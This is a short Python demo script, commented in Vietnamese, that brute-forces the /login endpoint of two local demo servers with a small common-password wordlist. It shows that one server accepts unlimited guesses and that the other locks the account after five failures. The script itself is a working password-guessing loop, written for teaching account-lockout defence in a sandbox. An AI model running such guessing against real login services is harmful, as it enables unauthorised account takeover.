"""
Mo phong brute-force / doan mat khau nham vao /login cua 2 server demo.
Chi chay nham vao 127.0.0.1 trong sandbox nay.

Chay:
    python3 vulnerable_server.py &   # port 8081
    python3 hardened_server.py &     # port 8082
    python3 attack_bruteforce.py
"""
import json
import time
import urllib.error
import urllib.request

WORDLIST = [
    "123456", "password", "admin123", "MatKhau2023", "MatKhau2024",
    "SuperSecret123", "qwerty", "letmein",
]


def call(port, username, password):
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/login",
        data=json.dumps({"username": username, "password": password}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def run(label, port, username):
    print(f"\n=== {label} (port {port}) -- brute-force user '{username}' ===")
    for i, pw in enumerate(WORDLIST, 1):
        status, body = call(port, username, pw)
        print(f"  [{i:02d}] thu mat khau {pw!r:20} -> HTTP {status} {body}")
        if status == 200:
            print(f"  ==> DO MAT KHAU THANH CONG: {pw!r}")
            break
        if status == 423:
            print("  ==> TAI KHOAN DA BI KHOA, brute-force bi chan lai day.")
            break
        time.sleep(0.05)


if __name__ == "__main__":
    run("VULNERABLE (khong khoa tai khoan)", 8081, "admin")
    run("HARDENED (khoa sau 5 lan sai, giong app.security.brute-force that)", 8082, "admin")
